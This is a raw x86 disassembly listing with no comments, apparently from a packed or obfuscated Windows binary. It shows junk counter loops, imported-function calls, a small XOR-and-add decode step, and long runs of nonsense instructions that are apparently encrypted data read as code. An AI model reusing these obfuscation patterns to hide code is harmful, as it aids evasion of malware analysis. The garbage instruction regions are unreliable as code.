  40832b:	and    DWORD PTR ds:0x4235db,0x0
  408335:	jmp    0x408347
  40833a:	mov    ecx,DWORD PTR ds:0x4235db
  408340:	inc    ecx
  408341:	mov    DWORD PTR ds:0x4235db,ecx
  408347:	cmp    DWORD PTR ds:0x4235db,0x1a
  40834e:	jae    0x408391
  408354:	cmp    DWORD PTR ds:0x4235db,0xb
  40835b:	jne    0x40836c
  408361:	push   0x561f
  408366:	call   DWORD PTR ds:0x40d36c
  40836c:	cmp    DWORD PTR ds:0x4235db,0xa
  408373:	jne    0x408386
  408379:	mov    ecx,DWORD PTR ds:0x4235db
  40837f:	inc    ecx
  408380:	mov    DWORD PTR ds:0x4235db,ecx
  408386:	jmp    0x40833a
  40838b:	inc    DWORD PTR ds:0x412370
  408391:	mov    ecx,DWORD PTR [ebp+0x8]
  408394:	and    DWORD PTR ds:0x417e55,0x0
  40839e:	jmp    0x4083b1
  4083a3:	xor    eax,eax
  4083a5:	or     eax,DWORD PTR ds:0x417e55
  4083ab:	inc    eax
  4083ac:	mov    ds:0x417e55,eax
  4083b1:	cmp    DWORD PTR ds:0x417e55,0x1f
  4083b8:	jae    0x4083df
  4083be:	cmp    DWORD PTR ds:0x417e55,0x21
  4083c5:	jne    0x4083d4
  4083cb:	push   DWORD PTR [ebp-0x14]
  4083ce:	call   DWORD PTR ds:0x40d008
  4083d4:	jmp    0x4083a3
  4083d9:	sub    DWORD PTR ds:0x4235db,edi
  4083df:	mov    eax,0x8a43
  4083e4:	sub    DWORD PTR ds:0x415101,0x2da0
  4083ee:	jmp    0x408517
  4083f3:	dec    ecx
  4083f4:	pushf  
  4083f5:	push   esp
  4083f6:	in     eax,dx
  4083f7:	imul   esp,ebp,0x9f63b859
  4083fd:	mov    DWORD PTR [ebx+eax*4+0x61e5b129],ebp
  408404:	adc    al,0x7e
  408406:	jle    0x408412
  408408:	jg     0x408488
  40840a:	jle    0x408432
  40840c:	icebp  
  40840d:	into   
  40840e:	fdivp  st(0),st
  408410:	or     dh,BYTE PTR [ebp-0x66]
  408413:	out    dx,eax
  408414:	and    BYTE PTR [ebp+eax*1-0x75415ba3],bl
  40841b:	sti    
  40841c:	pop    ss
  40841d:	pop    ebp
  40841e:	nop
  40841f:	loope  0x4083fe
  408421:	inc    esp
  408422:	push   ss
  408423:	pop    ecx
  408424:	cmp    ah,BYTE PTR [edi*1-0xb545346]
  40842b:	clc    
  40842c:	cmp    al,BYTE PTR ds:0x34d92f53
  408432:	sbb    dl,0xc3
  408435:	in     eax,dx
  408436:	in     eax,dx
  408437:	mov    ebx,DWORD PTR [ebp-0x1f]
  40843a:	call   0xeb6:0xf60ce301
  408441:	inc    eax
  408442:	mov    ch,0x6a
  408444:	or     al,0x55
  408446:	ror    DWORD PTR [edx-0x64],0x3
  40844a:	mov    ebx,DWORD PTR [esi+0x5a6630af]
  408450:	xchg   ecx,eax
  408451:	addr16 or al,0xcc
  408454:	ss dec edi
  408456:	cdq    
  408457:	retf   
  408458:	pop    ds
  408459:	ds pop edx
  40845b:	idiv   BYTE PTR [esi+0x14]
  40845e:	inc    ecx
  40845f:	(bad)  
  408460:	repnz sbb dh,BYTE PTR cs:[edi+ebp*2]
  408465:	jae    0x4083ed
  408467:	outs   dx,DWORD PTR ds:[esi]
  408468:	jmp    0x40846d
  40846a:	or     eax,edx
  40846c:	ins    DWORD PTR es:[edi],dx
  40846d:	je     0x408499
  40846f:	stos   BYTE PTR es:[edi],al
  408470:	jmp    0xb50c:0x4c2c455b
  408477:	dec    edx
  408478:	push   cs
  408479:	sub    eax,0x9018a9ee
  40847e:	xchg   edi,eax
  40847f:	mov    cl,0x26
  408481:	bound  ebx,QWORD PTR [esi]
  408483:	ror    BYTE PTR [edx+0x20318375],0xe3
  40848a:	fidivr DWORD PTR [edi+0x30474e07]
  408490:	arpl   WORD PTR [edx+0x54ee9a28],dx
  408496:	mov    ah,0x2b
  408498:	lahf   
  408499:	sub    al,0x65
  40849b:	aas    
  40849c:	pop    esp
  40849d:	push   ss
  40849e:	jl     0x408448
  4084a0:	adc    DWORD PTR [ecx-0x3e89c0bc],esi
  4084a6:	dec    esi
  4084a7:	into   
  4084a8:	fdivr  st(6),st
  4084aa:	enter  0x8739,0x6
  4084ae:	push   es
  4084af:	aam    0x38
  4084b1:	add    edx,DWORD PTR [esi+0x4274fe80]
  4084b7:	push   ds
  4084b8:	inc    eax
  4084b9:	mov    ds:0x7f09ff68,eax
  4084be:	cdq    
  4084bf:	inc    esp
  4084c0:	xor    al,0xbd
  4084c2:	mov    WORD PTR [eax+0x5e],cs
  4084c5:	stos   DWORD PTR es:[edi],eax
  4084c6:	and    DWORD PTR [edx],0xffffffcf
  4084c9:	pop    edx
  4084ca:	ins    BYTE PTR es:[edi],dx
  4084cb:	ds test eax,0xb1197ecc
  4084d1:	lds    eax,FWORD PTR [ebx-0x35]
  4084d4:	test   DWORD PTR [ecx+eiz*8-0x59db22e3],edi
  4084db:	outs   dx,BYTE PTR ds:[esi]
  4084dc:	(bad)  
  4084dd:	adc    al,0x1c
  4084df:	pop    ebx
  4084e0:	mov    edi,0xef1da1dc
  4084e5:	jnp    0x408544
  4084e7:	sahf   
  4084e8:	inc    edx
  4084e9:	push   gs
  4084eb:	leave  
  4084ec:	jbe    0x4084e2
  4084ee:	mov    ebp,0x5bae02f5
  4084f3:	sbb    BYTE PTR [ecx],bl
  4084f5:	loope  0x4084c1
  4084f7:	xchg   esp,eax
  4084f8:	push   0xe7b92a47
  4084fd:	int    0x86
  4084ff:	xchg   esp,eax
  408500:	fnstenv [edx-0x2bd3a2dc]
  408506:	adc    ecx,ebx
  408508:	adc    BYTE PTR [eax-0x1b9dc656],al
  40850e:	jne    0x4084e3
  408510:	and    bl,dl
  408512:	dec    DWORD PTR [ebx+0x6685b589]
  408518:	xor    eax,DWORD PTR [ecx+0x20]
  40851b:	mov    ecx,0x3b0a
  408520:	not    DWORD PTR ds:0x41abce
  408526:	add    ax,cx
  408529:	mov    ecx,DWORD PTR ds:0x417e49
  40852f:	or     ecx,DWORD PTR ds:0x412374
  408535:	mov    DWORD PTR ds:0x417e49,ecx
  40853b:	jmp    0x408664
  408540:	sub    cl,BYTE PTR [ebp-0x31]
  408543:	xchg   esp,eax
  408544:	jns    0x4084da
  408546:	jns    0x408589
  408548:	or     eax,0xff26a896
  40854d:	ja     0x408558
  40854f:	lods   al,BYTE PTR ds:[esi]
  408550:	jge    0x40857c
  408552:	jle    0x4085d2
  408554:	or     bh,BYTE PTR [edi+0x7e]
  408557:	jle    0x408525
  408559:	ins    DWORD PTR es:[edi],dx
  40855a:	xor    DWORD PTR [ebx+0x59113bfa],edx
  408560:	mov    ebp,DWORD PTR [edx+0x4a]
  408563:	xchg   ebx,eax
  408564:	clc    
  408565:	rcl    BYTE PTR [ecx-0x7b31340e],0x5a
  40856c:	cmp    BYTE PTR [eax+ebp*1+0x1d],ch
  408570:	push   es
  408571:	loopne 0x4085b5
  408573:	mov    bl,0xa0
  408575:	push   edi
  408576:	into   
  408577:	loopne 0x4085a9
  408579:	xchg   edx,eax
  40857a:	stc    
  40857b:	sbb    DWORD PTR ds:0xcda9fc2a,edi
  408581:	dec    esp
  408582:	adc    al,0xd6
  408584:	(bad)  
  408585:	ss ja  0x4085ad
  408588:	jb     0x40859f
  40858a:	jle    0x4085e5
  40858c:	mov    ebx,0x3d98a5c4
  408591:	xor    DWORD PTR [eax-0x5a222518],edx
  408597:	xchg   edi,eax
  408598:	je     0x4085d9
  40859a:	add    BYTE PTR [esi+0x16a0faa8],dh
  4085a0:	les    eax,FWORD PTR [eax]
  4085a2:	outs   dx,BYTE PTR ds:[esi]
  4085a3:	dec    esi
  4085a4:	scas   eax,DWORD PTR es:[edi]
  4085a5:	push   eax
  4085a6:	mov    BYTE PTR ds:0x3a7c68e,ah
  4085ac:	pop    edi
  4085ad:	push   ebx
  4085ae:	push   esp
  4085af:	daa    
  4085b0:	pop    edi
  4085b1:	outs   dx,BYTE PTR ds:[esi]
  4085b2:	sbb    al,0xcd
  4085b4:	rol    DWORD PTR [edi],0x7e
  4085b7:	xchg   esi,eax
  4085b8:	xor    BYTE PTR [eax],ah
  4085ba:	mov    ah,0xed
  4085bc:	mov    eax,ds:0xb0bab405
  4085c1:	adc    al,0xc1
  4085c3:	cwde   
  4085c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085c5:	scas   al,BYTE PTR es:[edi]
  4085c6:	xor    bh,ah
  4085c8:	pop    ebx
  4085c9:	sub    BYTE PTR [edx-0x69],0x4d
  4085cd:	test   BYTE PTR [ebx-0x2a596386],ch
  4085d3:	std    
  4085d4:	add    DWORD PTR [edi+0x3bc92489],0xd8381790
  4085de:	mov    bl,0x2a
  4085e0:	ds and eax,0xb6c7c7aa
  4085e6:	sahf   
  4085e7:	inc    ebx
  4085e8:	int3   
  4085e9:	and    eax,0xf0ce1360
  4085ee:	retf   0x956e
  4085f1:	dec    esp
  4085f2:	cmp    ecx,esp
  4085f4:	dec    ebp
  4085f5:	sbb    esp,DWORD PTR [edx+0x3d]
  4085f8:	clc    
  4085f9:	lods   al,BYTE PTR ds:[esi]
  4085fa:	mov    al,0x7b
  4085fc:	fisttp QWORD PTR [edx-0x4]
  4085ff:	or     dh,BYTE PTR [eax]
  408601:	mov    al,0x4e
  408603:	mov    al,ds:0xd1351be6
  408608:	xor    edx,ecx
  40860a:	xchg   esp,eax
  40860b:	mov    DWORD PTR [esi],edi
  40860d:	jne    0x4085fd
  40860f:	mov    al,0xbd
  408611:	xchg   DWORD PTR [edi-0x7446763a],edi
  408617:	fiadd  WORD PTR [edi-0x69]
  40861a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40861b:	rol    dh,0xc6
  40861e:	ror    DWORD PTR [ecx+esi*4],0x83
  408622:	mov    eax,DWORD PTR [ecx+0x0]
  408625:	(bad)  
  408626:	mov    edi,DWORD PTR [ecx]
  408628:	or     esi,DWORD PTR [edi+0x3f]
  40862b:	rcl    DWORD PTR [edi+0x15c5a68e],0x46
  408632:	in     al,dx
  408633:	ret    
  408634:	sub    DWORD PTR [esi],ecx
  408636:	push   cs
  408637:	test   al,0x17
  408639:	gs jae 0x408612
  40863c:	pop    DWORD PTR [eax+0x115a800f]
  408642:	clc    
  408643:	ja     0x40861f
  408645:	leave  
  408646:	pop    eax
  408647:	int    0xeb
  408649:	mov    edx,0xc5b21294
  40864e:	icebp  
  40864f:	repz xchg ecx,eax
  408651:	mov    esp,0x5e4134eb
  408656:	in     al,dx
  408657:	arpl   WORD PTR [eax-0x18],cx
  40865a:	bound  edi,QWORD PTR [eax+0x40201aea]
  408660:	bound  esp,QWORD PTR [edx-0x48f06996]
  408666:	rol    BYTE PTR [ebx],0xd
  408669:	dec    ecx
  40866a:	jle    0x4086ad
  40866c:	add    BYTE PTR [ecx+0x45c6f445],cl
  408672:	(bad)  
  408673:	jg     0x408602
  408675:	inc    ebp
  408676:	jmp    DWORD PTR [ecx]
  408678:	adc    eax,0x4235d7
  40867d:	mov    DWORD PTR [ebp-0x10],eax
  408680:	mov    DWORD PTR ds:0x41510d,0x1a
  40868a:	cmp    DWORD PTR ds:0x41510d,0x0
  408691:	je     0x4086bf
  408697:	cmp    DWORD PTR ds:0x41510d,0x25
  40869e:	jne    0x4086ad
  4086a4:	push   DWORD PTR [ebp-0x18]
  4086a7:	call   DWORD PTR ds:0x40d370
  4086ad:	mov    ecx,DWORD PTR ds:0x41510d
  4086b3:	dec    ecx
  4086b4:	mov    DWORD PTR ds:0x41510d,ecx
  4086ba:	jmp    0x40868a
  4086bf:	mov    al,BYTE PTR [ebp-0x1]
  4086c2:	and    DWORD PTR ds:0x4150fd,0x0
  4086cc:	mov    ecx,DWORD PTR ds:0x4150fd
  4086d2:	inc    ecx
  4086d3:	mov    DWORD PTR ds:0x4150fd,ecx
  4086d9:	cmp    DWORD PTR ds:0x4150fd,0x11
  4086e0:	jne    0x4086f1
  4086e6:	push   0x41ad87
  4086eb:	call   DWORD PTR ds:0x40d1e4
  4086f1:	cmp    DWORD PTR ds:0x4150fd,0x10
  4086f8:	jne    0x40870b
  4086fe:	mov    ecx,DWORD PTR ds:0x4150fd
  408704:	inc    ecx
  408705:	mov    DWORD PTR ds:0x4150fd,ecx
  40870b:	cmp    DWORD PTR ds:0x4150fd,0x1f
  408712:	jb     0x4086cc
  408718:	neg    ecx
  40871a:	mov    ecx,DWORD PTR [ebp-0x10]
  40871d:	xor    al,0x4a
  40871f:	or     DWORD PTR ds:0x41abe2,0x415105
  408729:	sub    al,0x34
  40872b:	mov    BYTE PTR [ecx],al
  40872d:	xor    ecx,ecx
  40872f:	jmp    0x408858
  408734:	adc    DWORD PTR [ebx+0xc],ebx
  408737:	(bad)  
  408738:	fs pop ecx
  40873a:	jmp    0x44b4d3b8
  40873f:	fisub  DWORD PTR [edi+eax*4]
  408742:	dec    ebp
  408743:	push   0x7e7e2b09
  408748:	or     bh,BYTE PTR [edi+0x7e]
  40874b:	jle    0x408771
  40874d:	xor    edi,esi
  40874f:	jp     0x408796
  408751:	lds    eax,FWORD PTR [eax]
  408753:	pop    edx
  408754:	xlat   BYTE PTR ds:[ebx]
  408755:	lods   al,BYTE PTR ds:[esi]
  408756:	scas   al,BYTE PTR es:[edi]
  408757:	xlat   BYTE PTR ds:[ebx]
  408758:	pop    ecx
  408759:	fwait
  40875a:	in     eax,dx
  40875b:	mov    bh,0xf3
  40875d:	dec    edi
  40875e:	fisub  DWORD PTR [eax]
  408760:	xor    eax,0xe31f29e4
  408765:	cmp    ebx,ecx
  408767:	inc    edi
  408768:	leave  
  408769:	mov    esp,0x78db6ae0
  40876e:	outs   dx,DWORD PTR ds:[esi]
  40876f:	mov    bl,0xb5
  408771:	ins    BYTE PTR es:[edi],dx
  408772:	ds push edx
  408774:	pop    ss
  408775:	dec    ebx
  408776:	or     DWORD PTR [ecx+0x5a],esi
  408779:	fnstenv [ebx]
  40877b:	inc    esi
  40877c:	mov    al,BYTE PTR [ebp+0x1837ebbe]
  408782:	outs   dx,BYTE PTR ds:[esi]
  408783:	out    dx,eax
  408784:	test   al,0xbe
  408786:	lock mov ?,WORD PTR [ebp+esi*2-0x72]
  40878b:	adc    DWORD PTR [ecx],eax
  40878d:	cmp    cl,bh
  40878f:	jno    0x4087ab
  408791:	ss aas 
  408793:	clc    
  408794:	mov    WORD PTR [ebx+eax*4],ss
  408797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408798:	and    al,0x19
  40879a:	in     eax,dx
  40879b:	xchg   esp,eax
  40879c:	std    
  40879d:	mov    dh,0x68
  40879f:	sub    BYTE PTR [edi+0x211c1235],bl
  4087a5:	out    0xd,al
  4087a7:	jge    0x40881e
  4087a9:	out    dx,eax
  4087aa:	sbb    DWORD PTR cs:[edi-0x2],ebx
  4087ae:	in     eax,dx
  4087af:	or     edx,DWORD PTR [ebx+0x40]
  4087b2:	pop    edx
  4087b3:	mov    al,0x8
  4087b5:	dec    eax
  4087b6:	fsubr  QWORD PTR [edx]
  4087b8:	mov    al,0xc4
  4087ba:	lods   eax,DWORD PTR ds:[esi]
  4087bb:	cdq    
  4087bc:	cmp    BYTE PTR [ecx+0x52d053fa],0x14
  4087c3:	(bad)  
  4087c4:	xchg   esi,eax
  4087c5:	aad    0x8d
  4087c7:	cs jp  0x40874d
  4087ca:	lds    edx,FWORD PTR [ebp+0x34]
  4087cd:	cli    
  4087ce:	jo     0x40882e
  4087d0:	into   
  4087d1:	clc    
  4087d2:	inc    esi
  4087d3:	mov    ds,WORD PTR [esi]
  4087d5:	loope  0x4087f7
  4087d7:	fld    DWORD PTR [edx]
  4087d9:	shl    BYTE PTR [edi-0x3e],1
  4087dc:	(bad)  
  4087dd:	ficom  WORD PTR [ecx]
  4087df:	or     DWORD PTR [esi+0x76],ecx
  4087e2:	and    DWORD PTR [ebp+0x1d901200],edx
  4087e8:	adc    al,0x50
  4087ea:	sar    DWORD PTR ds:0x3835814a,cl
  4087f0:	pop    esp
  4087f1:	xchg   ebp,eax
  4087f2:	push   ds
  4087f3:	repnz jecxz 0x4087d0
  4087f6:	fimul  WORD PTR [ecx]
  4087f8:	xchg   ebx,eax
  4087f9:	loopne 0x4087f1
  4087fb:	adc    BYTE PTR [edi],dh
  4087fd:	bound  esi,QWORD PTR [esp+edx*4-0x246f7dbe]
  408804:	add    al,BYTE PTR [ebx]
  408806:	jb     0x4087f6
  408808:	ror    BYTE PTR [ebp+0x7f5ca6cb],1
  40880e:	dec    ebx
  40880f:	mov    dl,0x14
  408811:	sub    eax,0xa43665c4
  408816:	mov    ebx,0x7f133108
  40881b:	or     dh,al
  40881d:	sti    
  40881e:	add    bl,al
  408820:	repz cmp al,0x24
  408823:	sbb    al,0xbe
  408825:	push   es
  408826:	iret   
  408827:	(bad)  
  408828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408829:	dec    eax
  40882a:	addr16 ja 0x4087fd
  40882d:	xor    DWORD PTR [eax+0x6],ebp
  408830:	dec    eax
  408831:	and    ebp,edi
  408833:	jmp    0xf3d7eadc
  408838:	add    ah,ah
  40883a:	neg    BYTE PTR [ecx]
  40883c:	repz (bad) 
  40883e:	or     edx,ecx
  408840:	sahf   
  408841:	es xor eax,0x5d7f8127
  408847:	fdivr  DWORD PTR [ebx-0x6b]
  40884a:	scas   eax,DWORD PTR es:[edi]
  40884b:	js     0x4087e1
  40884d:	enter  0x6081,0xc6
  408851:	fs dec edi
  408853:	gs cmp al,0x23
  408856:	ret    
  408857:	fadd   st(7),st
  408859:	inc    ebp
  40885a:	clc    
  40885b:	cmp    BYTE PTR [ebp+0x1581f89c],al
  408861:	jo     0x408886
  408863:	inc    ecx
  408864:	add    BYTE PTR [esi-0x38ffffe9],al
  40886a:	inc    ebp
  40886b:	lock cmp eax,DWORD PTR [ebp+0x458bf89c]
  408872:	clc    
  408873:	xor    ecx,ecx
  408875:	add    ecx,DWORD PTR ds:0x417e59
  40887b:	sbb    DWORD PTR ds:0x41abde,ecx
  408881:	mov    ecx,0x7510859
  408886:	add    DWORD PTR ds:0x41abe6,0x417e51
  408890:	push   esi
  408891:	and    DWORD PTR ds:0x417e59,0x0
  40889b:	mov    esi,DWORD PTR ds:0x417e59
  4088a1:	inc    esi
  4088a2:	mov    DWORD PTR ds:0x417e59,esi
  4088a8:	cmp    DWORD PTR ds:0x417e59,0x9
  4088af:	jne    0x4088f1
  4088b5:	push   0x41ad06
  4088ba:	push   DWORD PTR [ebp-0x10]
  4088bd:	push   DWORD PTR [ebp-0x14]
  4088c0:	push   0x6f38
  4088c5:	push   0x208a
  4088ca:	push   0x8fdb
  4088cf:	push   0x1d69
  4088d4:	push   DWORD PTR [ebp-0x20]
  4088d7:	push   0x57cc
  4088dc:	push   DWORD PTR [ebp-0x10]
  4088df:	push   DWORD PTR [ebp-0x28]
  4088e2:	push   DWORD PTR [ebp-0x24]
  4088e5:	push   DWORD PTR [ebp-0x28]
  4088e8:	push   DWORD PTR [ebp-0x1c]
  4088eb:	call   DWORD PTR ds:0x40d374
  4088f1:	cmp    DWORD PTR ds:0x417e59,0x8
  4088f8:	jne    0x40890d
  4088fe:	xor    esi,esi
  408900:	add    esi,DWORD PTR ds:0x417e59
  408906:	inc    esi
  408907:	mov    DWORD PTR ds:0x417e59,esi
  40890d:	cmp    DWORD PTR ds:0x417e59,0x13
  408914:	jb     0x40889b
  40891a:	xor    eax,ecx
  40891c:	mov    esi,0x32729f
  408921:	add    eax,esi
  408923:	jmp    0x408930
  408928:	mov    dl,BYTE PTR [ebp-0x1]
  40892b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40892f:	inc    eax
  408930:	cmp    eax,0x40
  408933:	jb     0x408928
  408939:	mov    edx,DWORD PTR [ebp-0x8]
  40893c:	mov    eax,DWORD PTR [ebp-0xc]
  40893f:	jmp    0x408a68
  408944:	sub    eax,0xb98f82f6
  408949:	fwait
  40894a:	and    DWORD PTR [eax+eax*1+0xad74167],edx
  408951:	mov    es,WORD PTR [edi+0x4a]
  408954:	add    eax,0xa7e7e28
  408959:	jg     0x4089d9
  40895b:	jle    0x40896e
  40895d:	adc    al,0xfd
  40895f:	test   dh,dh
  408961:	mov    fs,ebp
  408963:	lds    ebp,FWORD PTR [ebp+0x3c500f2a]
  408969:	(bad)  
  40896a:	jmp    0xaac608e1
  40896f:	dec    edi
  408970:	add    al,0xed
  408972:	cmp    DWORD PTR [ebx-0x3],0xffffff9b
  408976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408977:	xchg   DWORD PTR [esi+0x7ec353d4],esp
  40897d:	es in  al,dx
  40897f:	push   ds
  408980:	imul   esi,DWORD PTR [ebp+0x7d92642d],0xffffffb9
  408987:	test   al,0x81
  408989:	pop    ds
  40898a:	and    al,0x4d
  40898c:	out    dx,eax
  40898d:	loop   0x4089e5
  40898f:	stc    
  408990:	into   
  408991:	adc    al,0x52
  408993:	iret   
  408994:	inc    eax
  408995:	sbb    BYTE PTR [ecx-0x27d1c5e2],dl
  40899b:	or     BYTE PTR [edi-0x4a],bh
  40899e:	aas    
  40899f:	push   ebx
  4089a0:	and    DWORD PTR [ebx+0x61305092],edx
  4089a6:	(bad)
  4089aa:	xchg   ebx,eax
  4089ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089ac:	dec    esi
  4089ad:	imul   ecx,DWORD PTR [eax-0x3b1886df],0x77fb58c9
  4089b7:	stc    
  4089b8:	adc    DWORD PTR [edi+0xb],esi
  4089bb:	dec    ebx
  4089bc:	jp     0x4089b9
  4089be:	mov    esi,0x64e2f06d
  4089c3:	std    
  4089c4:	mov    ds:0x7ba950e2,eax
  4089c9:	push   eax
  4089ca:	mov    al,0xb1
  4089cc:	lods   eax,DWORD PTR ds:[esi]
  4089cd:	xchg   esi,eax
  4089ce:	mov    ah,0xd6
  4089d0:	xchg   edi,eax
  4089d1:	mov    fs:0xffbc46b8,eax
  4089d7:	shr    dl,0x2b
  4089da:	setae  bh
  4089dd:	and    esi,esi
  4089df:	xchg   esp,eax
  4089e0:	je     0x4089ca
  4089e2:	dec    esp
  4089e3:	xor    al,0x94
  4089e5:	cld    
  4089e6:	push   ds
  4089e7:	call   0x4743:0xb121dae0
  4089ee:	lock into 
  4089f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089f1:	jae    0x4089b1
  4089f3:	outs   dx,DWORD PTR ds:[esi]
  4089f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089f5:	pop    ss
  4089f6:	mov    ds:0xe6d14e6c,al
  4089fb:	in     eax,0x20
  4089fd:	dec    ebx
  4089fe:	sub    al,0x21
  408a00:	mov    bh,0xa
  408a02:	xchg   edi,eax
  408a03:	cmp    al,0x76
  408a05:	xchg   ebx,eax
  408a06:	add    eax,0xb25664d4
  408a0b:	rcr    BYTE PTR [edx-0x62],cl
  408a0e:	add    al,0x25
  408a10:	add    cl,bh
  408a12:	jle    0x4089b6
  408a14:	xchg   edx,eax
  408a15:	push   esi
  408a16:	xchg   ebx,eax
  408a17:	enter  0xddeb,0x1f
  408a1b:	xlat   BYTE PTR ds:[ebx]
  408a1c:	cwde   
  408a1d:	out    dx,al
  408a1e:	jle    0x408a9f
  408a20:	les    esi,FWORD PTR [ebx]
  408a22:	adc    ecx,ebx
  408a24:	pop    es
  408a25:	push   ebp
  408a26:	in     al,0x18
  408a28:	pop    ds
  408a29:	cmovb  edi,eax
  408a2c:	out    0xa9,al
  408a2e:	or     al,0x4
  408a30:	and    bl,BYTE PTR [ebp+0x626abee6]
  408a36:	mov    esp,0xe5612d6f
  408a3b:	mov    dh,0xe8
  408a3d:	jg     0x408a8a
  408a3f:	in     al,0xa2
  408a41:	cmp    eax,0xc0ed1bcc
  408a46:	mov    esp,ecx
  408a48:	push   ds
  408a49:	jne    0x408a86
  408a4b:	xor    BYTE PTR [ebx],dh
  408a4d:	lock adc BYTE PTR [ecx],ch
  408a50:	mov    DWORD PTR [ebp+eiz*2+0x70],ecx
  408a54:	or     ecx,DWORD PTR [esi]
  408a56:	sub    BYTE PTR [ecx],dh
  408a58:	dec    edi
  408a59:	fstp   DWORD PTR [ebp-0x33d637de]
  408a5f:	and    ah,dh
  408a61:	adc    eax,0x997f2c42
  408a66:	repnz daa 
  408a68:	xor    edx,ecx
  408a6a:	add    edx,esi
  408a6c:	cmp    edx,eax
  408a6e:	je     0x408d06
  408a74:	jmp    0x408b9d
  408a79:	xor    ecx,DWORD PTR [edx+ebx*1-0x14]
  408a7d:	cdq    
  408a7e:	js     0x408a69
  408a80:	popa   
  408a81:	cmp    ax,0xba8d
  408a85:	pop    ds
  408a86:	sub    ecx,DWORD PTR gs:[ecx+edx*1+0x29]
  408a8b:	jle    0x408b0b
  408a8d:	or     bh,BYTE PTR [edi+0x7e]
  408a90:	jle    0x408ab7
  408a92:	xchg   esi,eax
  408a93:	ret    0xca5c
  408a96:	test   DWORD PTR [edi-0x55f114f1],edx
  408a9c:	xor    al,0x28
  408a9e:	adc    ebx,ebx
  408aa0:	dec    ecx
  408aa1:	dec    ebp
  408aa2:	mov    ds:0x8ff38ffa,eax
  408aa7:	pop    ss
  408aa8:	push   ss
  408aa9:	push   0x8f1a13db
  408aae:	call   0xa200b58b
  408ab3:	xchg   ecx,eax
  408ab4:	sbb    cl,BYTE PTR [edx+0x9]
  408ab7:	mov    al,bl
  408ab9:	push   esi
  408aba:	int3   
  408abb:	outs   dx,BYTE PTR ds:[esi]
  408abc:	add    esi,DWORD PTR [ebp-0x6ae43ea9]
  408ac2:	ret    
  408ac3:	xchg   esi,eax
  408ac4:	(bad)  
  408ac5:	xchg   esp,eax
  408ac6:	enter  0x7db6,0xf4
  408aca:	push   esp
  408acb:	mov    esi,gs
  408acd:	imul   ebp,DWORD PTR [edx+0x72],0xa250c11a
  408ad4:	pop    ss
  408ad5:	push   ss
  408ad6:	and    edi,DWORD PTR [esi+0x29b70ba9]
  408adc:	sbb    al,BYTE PTR [edx+0x5307eadd]
  408ae2:	call   0x7334:0x9d1318f5
  408ae9:	adc    edx,DWORD PTR [esi-0x53]
  408aec:	inc    ebp
  408aed:	das    
  408aee:	cmc    
  408aef:	xor    bl,BYTE PTR [edx-0x10]
  408af2:	cmp    BYTE PTR [esp+edi*8],0x67
  408af6:	outs   dx,BYTE PTR ds:[esi]
  408af7:	xchg   edx,eax
  408af8:	leave  
  408af9:	cmp    bl,BYTE PTR [eax+ebx*2+0x4cda3a93]
  408b00:	test   DWORD PTR [edx-0x4bb211d8],edi
  408b06:	xchg   BYTE PTR ds:0x237bcb94,bh
  408b0c:	fld    DWORD PTR [esi+0x51]
  408b0f:	xchg   esp,eax
  408b10:	ror    ch,1
  408b12:	cdq    
  408b13:	or     bh,BYTE PTR [edx]
  408b15:	(bad)  
  408b16:	and    dl,BYTE PTR [edx-0x25]
  408b19:	inc    edi
  408b1a:	loopne 0x408aee
  408b1c:	jl     0x408b10
  408b1e:	div    ebx
  408b20:	and    al,0xad
  408b22:	mov    esi,0x289d89b6
  408b27:	push   es
  408b28:	clc    
  408b29:	xchg   edi,eax
  408b2a:	mov    edx,0x483a09b6
  408b2f:	cs hlt 
  408b31:	jb     0x408ab5
  408b33:	xor    edx,DWORD PTR ds:0xcf55edba
  408b39:	mov    bh,BYTE PTR [esi+ebp*2]
  408b3c:	pop    eax
  408b3d:	js     0x408b2f
  408b3f:	sub    dh,bh
  408b41:	cmp    ebx,DWORD PTR [eax-0xfb37eb0]
  408b47:	jl     0x408ac9
  408b49:	cmp    DWORD PTR [edi-0x63],edx
  408b4c:	dec    ebp
  408b4d:	lods   eax,DWORD PTR ds:[esi]
  408b4e:	call   0x4f25195f
  408b53:	adc    ebx,DWORD PTR [eax-0x5e]
  408b56:	imul   esp,DWORD PTR [ebx],0x3
  408b59:	mov    WORD PTR [ebx+ecx*4],ss
  408b5c:	mov    edx,0x7990267
  408b61:	mov    esi,0x4ce2be8f
  408b66:	fs call 0x14bd:0x6981192e
  408b6e:	frstor [edx]
  408b70:	das    
  408b71:	jbe    0x408ba2
  408b73:	test   DWORD PTR [ebx],0xcbc51991
  408b79:	imul   esi,DWORD PTR [esi+0x45],0xffffffc4
  408b7d:	loop   0x408b58
  408b7f:	mov    al,BYTE PTR [ecx-0x1d47df52]
  408b85:	mov    eax,ds:0xfc99ca90
  408b8a:	adc    cl,BYTE PTR ds:[eax]
  408b8d:	ror    ah,1
  408b8f:	mov    ebx,0xf25ff68e
  408b94:	out    0xb7,al
  408b96:	test   esp,ecx
  408b98:	sbb    esp,DWORD PTR [ebx]
  408b9a:	jb     0x408b6c
  408b9c:	mov    DWORD PTR [ebx+0x57],edx
  408b9f:	mov    edi,DWORD PTR [ebp+0x8]
  408ba2:	mov    eax,0x8a43
  408ba7:	xor    ax,WORD PTR [edi+edx*4+0x2]
  408bac:	mov    edi,0x3b0a
  408bb1:	add    ax,di
  408bb4:	movzx  eax,ax
  408bb7:	mov    DWORD PTR [ebp-0x14],eax
  408bba:	mov    eax,DWORD PTR [ebp+0x8]
  408bbd:	jmp    0x408ce6
  408bc2:	(bad)  
  408bc3:	fcom   DWORD PTR [edx+eax*8]
  408bc6:	sub    dl,ah
  408bc8:	clc    
  408bc9:	fcomp  DWORD PTR [ebx+0x1b1369bd]
  408bcf:	sti    
  408bd0:	adc    BYTE PTR [edi],cl
  408bd2:	sub    eax,0xa7e7e2e
  408bd7:	jg     0x408c57
  408bd9:	jle    0x408b77
  408bdb:	jmp    0x13d03451
  408be0:	in     al,0x68
  408be2:	sbb    dh,BYTE PTR [eax-0x2b71ff2d]
  408be8:	fadd   st,st(5)
